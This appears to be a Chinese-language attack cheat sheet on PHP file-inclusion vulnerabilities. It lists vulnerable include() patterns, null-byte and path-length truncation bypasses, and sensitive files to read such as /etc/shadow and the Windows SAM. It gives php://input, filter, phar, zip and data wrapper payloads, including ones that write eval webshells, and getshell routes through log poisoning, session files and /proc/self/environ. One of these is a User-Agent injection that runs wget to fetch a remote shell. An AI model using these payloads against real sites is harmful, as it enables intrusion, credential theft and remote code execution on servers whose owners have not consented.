### 文件包含

```
漏洞原理：
1、参数可控
include($_POST["file"])
include($_GET["file"])
2、用户提交的文件名或者文件类型没有被过滤

注意：包含过来的文件，不管是什么类型文件，只要中间中有PHP格式代码均可被解析

文件包含四个函数:
include
include_once
功能一样，后者只需要包含一次即可,两个函数在包含过程中，如果找不到文件会告警，后续的代码会继续执行

requare
requare_once
功能一样，后者只需要包含一次即可,两个函数在包含过程中，如果找不到文件会报错，后续终止执行

文件包含的分类：没有配置要求

漏洞危害：
读取敏感文件(配置文件、服务器上配置文件等)
getshell
获取站点源码
```

### 文件包含分类

```
LFI（本地文件包含）
http://192.168.91.151/test.php?file   //入参应为file
写法1、
<?php include($_GET['file']); ?>
写法2、
<?php
	$file = $GET['file'];
	include $file;
?>

RFI（远程文件包含）:包含第三方服务器中文件 
形成条件：
1、开启allow_url_fopen（默认打开状态）和allow_url_include（php 5.2以后默认关闭）
2、远程文件必须不能是php，文件被解析后无法获取源码，导致远程包含为空。推荐使用txt、或者不适用后缀

<?php fputs(fopen("shell.php","w"),"<?php 一句话木马?>   
//写入文件后，执行远程包含。可在远程生成shell.php的一句话木马，路径为远程文件的同级目录

allow_url_fopen:本选项激活允许include、include_once等函数使用URL形式的fopen封装协议，可以包含远程文件
allow_url_include:PHP>=5.2 本选项激活允许访问远端文件，并解析

```

### 绕过截断

```
1、有后缀名限制的文件包含：
%00截断  PHP<5.3，magic_quotes_gpc = Off
2、有前缀限制的文件名:
使用目录跳转  ../ ./
3、加？(?.html  ？后接的是要给参数)或者#（#.html形成一个锚点）绕过后缀限制
适用于PHP<=5.3
4、#号绕过
http://127.0.0.1/test.php?file=test.txt%23
5、路径长度截断（windows OS，点号需要长于256；linux OS 长于4096）超出的部分会被丢弃
http://127.0.0.1/test.php?file=test.txt/././././   256个
6、点号截断
http://127.0.0.1/test.php?file=test.txt.....  256个
```

### 常见敏感路径

```
Windows系统

c:\boot.ini // 查看系统版本
c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
c:\windows\repair\sam // 存储Windows系统初次安装的密码
c:\ProgramFiles\mysql\my.ini // MySQL配置
c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
c:\windows\php.ini // php 配置信息

Linux/Unix系统

/etc/passwd // 账户信息
/etc/shadow // 账户密码文件
/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
/usr/local/app/php5/lib/php.ini // PHP相关配置
/etc/httpd/conf/httpd.conf // Apache配置文件
/etc/my.conf // mysql 配置文件
```

### PHP伪协议

#### php input://      写文件拿webshell

```
条件：allow_url_include=on;
	 allow_url_fopen不做要求

碰到file_get_contents()，优先考虑php input://  

http://127.0.0.1/test.php?file=php://input
post提交 <?php phpinfo();?>
post提交 <?php fputs(fopen("shell.php","w"),"<?php eva+l(\$_POST['cmd']);?>");?>
//记着在$前加\，防止$被转义   因为双引号可能会导致变量被解析
post提交 <?PHP fputs(fopen('shell1.php','w'),'<?php eva+l($_POST[cmd])?>');?>
```

#### php filter://    读取php文件

```
条件：无需任何条件
读取文件内容
写法1、
http://127.0.0.1/test.php?file=php://filter/read=convert.base64-encode/resource=index.php
写法2、
http://127.0.0.1/test.php?file=php://filter/convert.base64-encode/resource=index.php
写法3、  //未验证成功
http://127.0.0.1/test.php?file=php://filter/string.rot13/resource=index.php
```

#### php phar://     解析非php文件 （不管后缀是什么，都会当做压缩包来解压）

```
条件：php>=5.0,需要支持zip解压
info.txt-->打包成info.zip文件

写法1、相对路径
http://127.0.0.1/test.php?file=phar://test.zip/phpinfo.txt(最后的后缀名无所谓，可为phpinfo)
写法2、绝对路径
http://127.0.0.1/test.php?file=phar://C:/phpStudy/www/test.zip/phpinfo.txt
```

PHP file://  读取文件内容

```
http://127.0.0.1/test.php?file=file://C:/phpStudy/www/phpinfo.txt
```

#### php zip://    解析非php文件

```
条件：php>=5.3.0 使用的过程中只能用绝对路径，在压缩包名后 写上%23
注意在windows下测试要5.3.0<PHP<5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。

写法、	 
http://127.0.0.1/test.php?file=zip://C:/phpStudy/www/test.zip%23phpinfo.txt
http://127.0.0.1/test.php?file=zip://C:/phpStudy/www/test.zip#phpinfo.txt
```

#### php data://  解析非php文件

```
条件：php>=5.2
	 allow_url_fopen=on
 	 allow_url_include=on
写法1、
http://127.0.0.1/test.php?file=data://text/plain,<?php phpinfo() ?>

http://127.0.0.1/test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
base64加密 最后（=）可能需要url编码
```

### 通过可控的日志文件getshell

```
常见日志
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/sshd.log
/var/log/mail

注意事项：由于access.log和error.log可能过大，导致页面载入超时。可通过其他文件进行替代

1、利用方式：
http://127.0.0.1/test.php?file=../../../../../../../../<?php phpinfo();?>.php
2、该url请求会记录在access.log中
3、http://127.0.0.1/test.php?file=../../../../../../../../var/log/apache/access.log
```

### session文件包含getshell

```
获取服务器中session值  （RFI漏洞包含本地session,最终实现RCE（RCE=代码执行漏洞））
session存放路径/tmp/   或者/var/lib/php5/ 
/var/lib/php5/sess_193423543634232df3tfr55ygeee2e

1、通过phpinfo,或者猜解seesion存放位置  获取session_.save_path    如/var/lib/php5
2、session文件名为sess+cookie、sess+sessionid值组成,可通过开发者模式进行查看
3、访问 http://127.0.0.1/test.php?file=<?php phpinfo();?> 会留下session值
4、访问 http://127.0.0.1/test.php?file=../../../../../../../..//var/lib/php5/sess_193423543634232df3tfr55ygeee2e发现被解析
//sess_193423543634232df3tfr55ygeee2e 使用sess_cookie的值组成
```

### 通过/proc/self/environ getshell  

```
条件：
1、PHP通过CGI去解析
2、/proc/self/environ可读
/proc/self/environ会记录用户的UA （user_agent）  //该路径必须修改权限，让普通用户可读

访问http://127.0.0.1/test.php?file=../../../../../../../proc/self/environ

通过burp suite拦包，修改user agent头

法1、通过修改user agent头写入如下代码，是靶机远程下载，并命名为shell.php
<?system('wget 远程下载链接 -O shell.php');?>  //如果system函数不能用，可尝试exec()等函数
再次访问 http://127.0.0.1/test.php?file=../../../../../../../proc/self/environ

法2、通过修改user agent头，直接写入一句话木马
```























